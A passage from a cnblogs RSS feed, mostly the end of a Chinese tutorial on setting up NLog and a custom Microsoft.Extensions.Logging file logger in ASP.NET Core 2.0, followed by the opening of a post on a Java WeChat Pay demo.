    &amp;lt;target xsi:type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;File&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ownFile-web&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; fileName=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nlog-my-${shortdate}.log&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                 layout&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;${longdate}|${logger}|${uppercase:${level}}|${message} ${exception}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
    &amp;lt;target xsi:type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Null&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;blackhole&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
  &amp;lt;/targets&amp;gt;

  &amp;lt;rules&amp;gt;
    &amp;lt;!--All logs, including &lt;span&gt;from&lt;/span&gt; Microsoft--&amp;gt;
    &amp;lt;logger name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; minlevel=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; writeTo=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;allfile&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;

    &amp;lt;!--Skip Microsoft logs and so log only own logs--&amp;gt;
    &amp;lt;logger name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Microsoft.*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; minlevel=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; writeTo=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;blackhole&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; final=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
    &amp;lt;logger name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; minlevel=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; writeTo=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ownFile-web&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
  &amp;lt;/rules&amp;gt;

&amp;lt;/nlog&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;nlog.config&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;　　2.3依赖配置及调用&lt;/h3&gt;
&lt;p&gt;　　　　在startup.cs中配置日志工厂，添加使用的服务配置后在项目中就可以调用。&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　　　///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 配置
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;app&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;env&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;loggerFactory&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Configure(IApplicationBuilder app, IHostingEnvironment env, ILoggerFactory loggerFactory)
        {
            loggerFactory.AddNLog();&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;添加NLog  
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;读取Nlog配置文件，这里如果是小写，文件也一定是小写，否则linux下不识别  &lt;/span&gt;
            env.ConfigureNLog(Path.Combine(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;configs&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nlog.config&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
　　　　}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 　　　　nlog调用，如在Controller中调用，如：在HomeController中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/248833/201803/248833-20180326145918176-1502685292.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span lang=&quot;EN-US&quot;&gt;　　2.4 日志类型介绍&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; LogLevel
{
  Debug &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;,
  Verbose &lt;/span&gt;= &lt;span&gt;2&lt;/span&gt;&lt;span&gt;,
  Information &lt;/span&gt;= &lt;span&gt;3&lt;/span&gt;&lt;span&gt;,
  Warning &lt;/span&gt;= &lt;span&gt;4&lt;/span&gt;&lt;span&gt;,
  Error &lt;/span&gt;= &lt;span&gt;5&lt;/span&gt;&lt;span&gt;,
  Critical &lt;/span&gt;= &lt;span&gt;6&lt;/span&gt;&lt;span&gt;,
  None &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;&lt;span&gt;.MaxValue
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　2.5产生的日志文件&lt;/h3&gt;
&lt;p&gt;　　　　日志的位置默认是在bin\Debug\netcoreapp2.0下面&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/248833/201803/248833-20180326150003947-1946442849.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　日志文件内容根据文件名可以很方便的区分开，其中nlog-all包含的内比较多，nlog-my中就只包含了我们记录日志的内容，大家动手试一下。&lt;/p&gt;

&lt;h2&gt;3.基于Microsoft.Extensions.Logging封装&lt;/h2&gt;
&lt;p&gt;　　由于受老项目webform影响，记录日志是在第三方类库dll中封装好了帮助类，这样在可以在项目中任何位置方便调用，这里我的nc.common工具库WLogger基于Microsoft NET Core的日志模型主要由三个核心对象构成，它们分别是Logger、LoggerProvider和LoggerFactory。现在只实现了文件记录日志txt，数据库模式有业务需求的朋友可自己扩展。&lt;/p&gt;

&lt;h3&gt;　　3.1添加引用Microsoft.Extensions.Logging&lt;/h3&gt;
&lt;p&gt;　　　　扩展微软日志记录框架,集成一个自己的Logger，现在扩展的是txt形式，后续可参考完善数据库模式。添加引用dll后，增加配置文件并配置，这里我先加在appsettings.json文件中，主要是配置是否开启日志和日志记录。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/248833/201803/248833-20180326150125825-741718772.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/248833/201803/248833-20180326150137442-638649451.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;h3&gt;　　3.2 实现我们的Logger&lt;/h3&gt;
&lt;p&gt;　　　　首先实现日志工厂的扩展LoggerFactoryExtensions，为net core 依赖注入LoggerFactory扩张一个方法，提供增加日志写文件方式的入口。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;&lt;img id=&quot;code_img_closed_1c253d43-ba9f-4f92-87ae-7907317f2662&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_1c253d43-ba9f-4f92-87ae-7907317f2662&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_1c253d43-ba9f-4f92-87ae-7907317f2662&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;59&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.Extensions.Logging;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; NC.Common
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; LoggerFactoryExtensions
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ILoggerFactory AddFileLogger(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; ILoggerFactory factory)
        {
            factory.AddProvider(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileLoggerProvider());
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; factory;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;LoggerFactoryExtensions&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　　　然后实现ILoggerProvider接口，FileLoggerProvider提供程序真正具有日志写入功能的Logger。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_798c9b19-ecd4-42f2-9e9b-dcb33c32b5f1&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_798c9b19-ecd4-42f2-9e9b-dcb33c32b5f1&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_798c9b19-ecd4-42f2-9e9b-dcb33c32b5f1&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.Extensions.Logging;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; NC.Common
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FileLoggerProvider : ILoggerProvider
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 默认构造函数，根据Provider进此构造函数
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;categoryName&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; ILogger CreateLogger(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; categoryName)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileLogger(categoryName);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Dispose()
        {
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;FileLoggerProvider&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　　　最后实现ILogger接口FileLogger继承并进行封装，方便写入文本日志。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39.5&quot;&gt;&lt;img id=&quot;code_img_closed_7f41f21f-576d-4319-8c86-a07ac05f6a6d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_7f41f21f-576d-4319-8c86-a07ac05f6a6d&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_7f41f21f-576d-4319-8c86-a07ac05f6a6d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;74&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.Extensions.Logging;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Collections.Generic;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.IO;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System.Text;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; NC.Common
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FileLogger : ILogger
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; name;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; IsOpen;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; WPath;
        
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; FileLogger(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; _name)
        {
            name &lt;/span&gt;=&lt;span&gt; _name;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IDisposable BeginScope&amp;lt;TState&amp;gt;&lt;span&gt;(TState state)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 是否禁用
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;logLevel&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; IsEnabled(LogLevel logLevel)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 实现接口ILogger
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;typeparam name=&quot;TState&quot;&amp;gt;&amp;lt;/typeparam&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;logLevel&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;eventId&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;state&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;formatter&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Log&amp;lt;TState&amp;gt;(LogLevel logLevel, EventId eventId, TState state, Exception exception, Func&amp;lt;TState, Exception, &lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt; formatter)
        {
            IsOpen &lt;/span&gt;= UtilConf.GetSection(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WLogger&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;IsOpen&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ? &lt;span&gt;true&lt;/span&gt; : &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (IsOpen)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取日志信息&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; message = formatter?&lt;span&gt;.Invoke(state, exception);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;日志写入文件&lt;/span&gt;
&lt;span&gt;                LogToFile(logLevel, message);
            }
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 记录日志
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;level&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;等级&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;日志内容&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; LogToFile(LogLevel level, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; message)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; filename =&lt;span&gt; GetFilename();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; logContent =&lt;span&gt; GetLogContent(level, message);
            File.AppendAllLines(filename, &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; List&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt; { logContent }, Encoding.UTF8);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 获取日志内容
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;level&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;等级&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;日志内容&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetLogContent(LogLevel level, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; message)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; $&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;[{DateTime.Now.ToString(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;yyyy-MM-dd HH:mm:ss.h3&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)}]{level}|{name}|{message}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; DirectorySeparatorChar = Path.DirectorySeparatorChar.ToString();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;目录分隔符&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 获取文件名
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetFilename()
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; dir = &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;
            WPath &lt;/span&gt;= UtilConf.GetSection(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WLogger&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)[&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;WPath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;];
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (WPath.IndexOf(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &amp;gt; -&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
            {
                dir &lt;/span&gt;=&lt;span&gt; WPath;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;此方法不是真正的获取应用程序的当前方法，而是执行dotnet命令所在目录&lt;/span&gt;
                dir = Directory.GetCurrentDirectory() +&lt;span&gt; WPath;
                
            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;Directory.Exists(dir))
                Directory.CreateDirectory(dir);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; result = $&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{dir}/WLog-{DateTime.Now.ToString(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;yyyy-MM-dd&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)}.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;.Replace(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,DirectorySeparatorChar);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; result;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;FileLogger&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;　　3.3 调用WLogger&lt;/h3&gt;
&lt;p&gt;　　　　在nc.common类库中封装好logger实现后，在调用连接使用数据库在core类库中调用实例如下。&lt;/p&gt;
&lt;p&gt;　　　　首先我们先做一下封装调用类&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;using&lt;/span&gt;&lt;span&gt; Microsoft.Extensions.Logging;

&lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; NC.Common
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UtilLogger&amp;lt;T&amp;gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; ILogger iLog;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; ILogger Log
        {
            &lt;/span&gt;&lt;span&gt;get&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (iLog != &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt;&lt;span&gt; iLog;

                &lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt;/第一种写法&lt;/span&gt;
                &lt;span&gt;//&lt;/span&gt;&lt;span&gt;ILoggerFactory loggerFactory = new LoggerFactory();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;loggerFactory.AddFileLogger();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;iLog = loggerFactory.CreateLogger&amp;lt;DbCommand&amp;gt;();

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;第二种写法&lt;/span&gt;
                iLog = &lt;span&gt;new&lt;/span&gt; LoggerFactory().AddFileLogger().CreateLogger&amp;lt;T&amp;gt;&lt;span&gt;();
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; iLog;
            }
            &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; =&amp;gt; iLog =&lt;span&gt; value;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p align=&quot;left&quot;&gt;　　　　然后在DbCommand中调用就可以直接写成：&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　　　　　public static ILogger Log = UtilLogger&amp;lt;DbCommand&amp;gt;.Log;//日志记录&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　　　　　Log. LogInformation(string);&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　　　　　Log.LogError(string)&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　　　详细方法还可以参考&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/248833/201803/248833-20180326150435517-438124811.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/248833/201803/248833-20180326150443812-675614581.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;h2&gt;4.总结&lt;/h2&gt;
&lt;p&gt;　　不管是生产环境还是开发环境，总会碰到这样或那样的问题，这时日志记录就为我们提供了记录分析问题的便利性，net core 2.0下记录日志功能是最需要我们及时实现的功能，这样为我们接下来的学习提供技术支撑。另外net　core 生态还不完善，很多功能需要我们自己动手去实现，在这里希望大家多动手去实现去分享，文中有不清楚或有问题欢迎留言讨论。&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/magazine/mt694089&quot;&gt;https://msdn.microsoft.com/magazine/mt694089&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-net-core-logging-2.html&quot;&gt;https://www.cnblogs.com/artech/p/inside-net-core-logging-2.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/calvinK/p/5673218.html&quot;&gt;https://www.cnblogs.com/calvinK/p/5673218.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 26 Mar 2018 07:12:00 +0000</pubDate>
<dc:creator>郑州-在路上</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/oorz/p/8651049.html</dc:identifier>
</item>
<item>
<title>Java 后端微信支付demo - 低调的小白</title>
<link>http://www.cnblogs.com/wang-yaz/p/8632624.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wang-yaz/p/8632624.html</guid>
<description>&lt;p&gt;一、导入微信SDK&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1327924/201803/1327924-20180326141235333-126086296.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
